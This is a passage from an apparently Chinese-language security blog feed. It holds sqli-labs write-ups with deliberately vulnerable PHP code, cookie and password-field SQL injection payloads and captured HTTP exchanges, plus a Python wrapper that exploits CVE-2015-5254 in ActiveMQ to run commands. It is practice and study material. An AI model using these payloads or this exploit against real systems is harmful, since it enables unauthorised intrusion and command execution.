size = 6 &gt;&apos;;</span><br><span class="line">echo &quot; Your Cookie is deleted&quot;;</span><br><span class="line">setcookie(&apos;uname&apos;, $row1[&apos;username&apos;], time()-3600);</span><br><span class="line">header (&apos;Location: index.php&apos;);</span><br><span class="line">echo &apos;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//header (&apos;Location: main.php&apos;);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">//echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&apos;;</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;Cookie:&apos;.$cookee.&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>从上面的代码可以看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登陆的时候对uname和passwd做了严格的过滤和去除反斜线，但是在通过cookie</span><br><span class="line">查询的时候没有做过滤直接进行查询，从而引发注入。</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/17/kp8TLn.png" alt="kp8TLn.png"></p><p>cookie中带入注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-20/index.php HTTP/1.1</span><br><span class="line">Host: 118.24.125.87:8000</span><br><span class="line">Content-Length: 0</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://118.24.125.87:8000</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Referer: http://118.24.125.87:8000/Less-20/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie:  uname=admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &apos;1&apos;=&apos;1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>返回结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 17 Jan 2019 05:37:48 GMT</span><br><span class="line">Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/5.5.9-1ubuntu4.13</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 1028</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;YOUR IP ADDRESS IS : 113.77.238.53&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&lt;font color= &quot;orange&quot; font size = 5 &gt;YOUR COOKIE : uname = admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &apos;1&apos;=&apos;1 and expires: Thu 17 Jan 2019 - 06:37:48&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &apos;~root@localhost~&apos;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/17/kp8vz4.png" alt="kp8vz4.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vulnerability project</title>
      <link href="/posts/b780d8aa.html"/>
      <url>/posts/b780d8aa.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天下午有个想法，嗯。暂时不得而知是什么想法，也就是写漏洞利用的项目吧。距离过年还有半个月左右，感觉越大过年没什么滋味了，小时候的朋友全部都分道扬镳。都是常规操作：</p><p>拜年——&gt;收钱<br>别人过来你这&lt;—–送钱<br>剩余时间：待在房间干自己的事情</p><p><img src="http://p1.pstatp.com/large/6c3a000368ec88077cc8" alt="6c3a000368ec88077cc8"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://vulhub.org/</span><br><span class="line">我打算把这里的漏洞全部复现一遍，然后写个漏洞利用集合体</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/16/kSrhZD.png" alt="kSrhZD.png"></p><p>刚刚复现完的第一个：<br><br><a href="https://github.com/422926799/haq5201314/blob/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6/doc/CVE-2015-5254.md" target="_blank" rel="noopener">CVE-2015-5254</a></p><p>这里就不重复了，直接看代码吧：</p><p>目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">├─arms</span><br><span class="line">│  └─jmet-master</span><br><span class="line">│      ├─external</span><br><span class="line">│      ├─scripts</span><br><span class="line">│      └─src</span><br><span class="line">│          ├─assembly</span><br><span class="line">│          └─main</span><br><span class="line">│              ├─java</span><br><span class="line">│              │  └─de</span><br><span class="line">│              │      └─codewhite</span><br><span class="line">│              │          └─jmet</span><br><span class="line">│              │              ├─exceptions</span><br><span class="line">│              │              ├─filter</span><br><span class="line">│              │              ├─messagetexts</span><br><span class="line">│              │              ├─payload</span><br><span class="line">│              │              │  └─impl</span><br><span class="line">│              │              ├─target</span><br><span class="line">│              │              │  └─impl</span><br><span class="line">│              │              ├─types</span><br><span class="line">│              │              └─wrapper</span><br><span class="line">│              └─resources</span><br><span class="line">├─doc</span><br><span class="line">└─plugin</span><br></pre></td></tr></table></figure><p>主要的脚本：<br>haq520.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#author:九世</span><br><span class="line">#time:2019/1/16</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    import readline</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">class Main:</span><br><span class="line">    def cve_2015_5254(self):</span><br><span class="line">        obj=__import__(&apos;plugin.CVE-2015-5254&apos;,fromlist=True) #导入了plugin文件里的CVE-2015-2524</span><br><span class="line">        daoru=getattr(obj,&apos;jiancha&apos;) #调用了jiancha()函数,此时：daoru=jiancha()</span><br><span class="line">        daoru()</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        daoru2=getattr(obj,&apos;run&apos;)</span><br><span class="line">        ips=input(&apos;IP:&apos;)</span><br><span class="line">        ports=input(&apos;port:&apos;)</span><br><span class="line">        execs=input(&apos;exec:&apos;)</span><br><span class="line">        daoru2(execs,ips,ports)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    obj=Main()</span><br><span class="line">    exp_list=[&apos;[1] CVE-2015-5254&apos;]</span><br><span class="line">    exp_cat=&#123;&apos;1&apos;:obj.cve_2015_5254&#125;</span><br><span class="line">    while True:</span><br><span class="line">        print(&apos;[h] exploit select:)&apos;)</span><br><span class="line">        for e in exp_list:</span><br><span class="line">            print(e)</span><br><span class="line">            print(&apos;&apos;)</span><br><span class="line">            print(&apos;&apos;)</span><br><span class="line">    </span><br><span class="line">        user=input(&apos;select:&gt;&apos;)</span><br><span class="line">        if user in exp_cat:</span><br><span class="line">            exp_cat.get(user)()</span><br><span class="line">            print(&apos;&apos;)</span><br><span class="line">            print(&apos;&apos;)</span><br><span class="line">        elif user==&apos;exit&apos;:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[e] Not Found select&apos;)</span><br><span class="line">            print(&apos;&apos;)</span><br><span class="line">            print(&apos;&apos;)</span><br><span class="line">            continue</span><br></pre></td></tr></table></figure><p>plugin插件里面的CVE-2015-5254</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#author:九世</span><br><span class="line">#time:2019/1/16</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def jiancha():</span><br><span class="line">    if os.path.exists(&apos;arms/jmet-master&apos;):</span><br><span class="line">        print(&apos;[h] Found arms/jmet-master&apos;)</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[q] Not Found arms/jmet-marser....&apos;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">def run(execq,ip,port):</span><br><span class="line">    execs=&apos;java -jar arms/jmet-master/jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;&#123;&#125;&quot; -Yp ROME &#123;&#125; &#123;&#125;&apos;.format(execq,ip,port)</span><br><span class="line">    zx=os.popen(execs)</span><br><span class="line">    zhenze=re.findall(&apos;ID:.*&apos;,str(zx.read()))</span><br><span class="line">    if len(zhenze)&gt;0:</span><br><span class="line">        print(&apos;[a] Found CVE-2015-5254&apos;)</span><br><span class="line">        for i in zhenze:</span><br><span class="line">            print(i)</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[q] Not Found CVE-2015-5254&apos;)</span><br></pre></td></tr></table></figure><p>测试效果：</p><p><img src="https://s2.ax1x.com/2019/01/16/kSrvdg.png" alt="kSrvdg.png"></p><p><img src="https://s2.ax1x.com/2019/01/16/kSrxoQ.png" alt="kSrxoQ.png"></p><p><b>这世界上所有的劣势都是由当事人的能力不足所造成的</b></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs_17 sqli-labs_19</title>
      <link href="/posts/789227f7.html"/>
      <url>/posts/789227f7.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天早上通关了sqli-labs-17-19关，感觉审计代码变得熟练了一点。懂的东西也慢慢变多了起来<br><img src="http://p2.qhimgs4.com/bdr/640__/t0130839d05078ff56a.jpg" alt="t0130839d05078ff56a.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先看第17关的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-17 Update Query- Error based - String&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;&gt;&lt;font color=&quot;#FFFF00&quot;&gt; [PASSWORD RESET] &lt;/br&gt;&lt;/font&gt;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div  align=&quot;center&quot; style=&quot;margin:20px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;padding-top:10px; font-size:15px;&quot;&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!--Form to post the contents --&gt;</span><br><span class="line">&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;User Name &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;: &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">    &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;div&gt; New Password : &amp;nbsp; &amp;nbsp;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;</span><br><span class="line">    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;</span><br><span class="line">&lt;font size=&quot;6&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;); /*包含了sql-connect.php*/</span><br><span class="line">error_reporting(0); /*报错级别设置为0*/</span><br><span class="line"></span><br><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value)) /*判断$value是否存在*/</span><br><span class="line">&#123;</span><br><span class="line">// truncation (see comments)</span><br><span class="line">$value = substr($value,0,15); /*取$value字符串从0的位置开始获取字符串，长度为15*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Stripslashes if magic quotes enabled</span><br><span class="line">if (get_magic_quotes_gpc()) /*返回当前 magic_quotes_gpc 配置选项的设置,为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &apos; (单引号)、&quot; (双引号)、\（反斜杠）和 NUL&apos;s 被一个反斜杠自动转义。*/</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Quote if not a number</span><br><span class="line">if (!ctype_digit($value)) /*检测字符串是否为数字*/</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value); /*intval — 获取变量的整数值*/</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) /*检测当前变量是否已设置并且不为null*/</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">//making sure uname is not injectable</span><br><span class="line">$uname=check_input($_POST[&apos;uname&apos;]);   /*调用check_input检查name*/</span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&apos;passwd&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;);</span><br><span class="line">fwrite($fp,&apos;New Password:&apos;.$passwd.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// connectivity </span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">//echo $row;</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;</span><br><span class="line">$row1 = $row[&apos;username&apos;];  </span><br><span class="line">//echo &apos;Your Login name:&apos;. $row1;</span><br><span class="line">$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br><span class="line">mysql_query($update);</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (mysql_error())</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">//echo &quot; You password has been successfully updated &quot; ;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&apos;;</span><br><span class="line">//echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">else  </span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">//echo &quot;Bug off you Silly Dumb hacker&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&apos;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/font&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>从代码中可以看到对uname做了很好的过滤，单是对passwd没有做好对应的过滤以至于可以被人从passwd下手注入。</p><p><img src="https://s2.ax1x.com/2019/01/14/FxU1fO.md.png" alt="FxU1fO.md.png"></p><p>在passwd注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1) #</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/14/FxUG1e.md.png" alt="FxUG1e.md.png"></p><p>第十八关：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 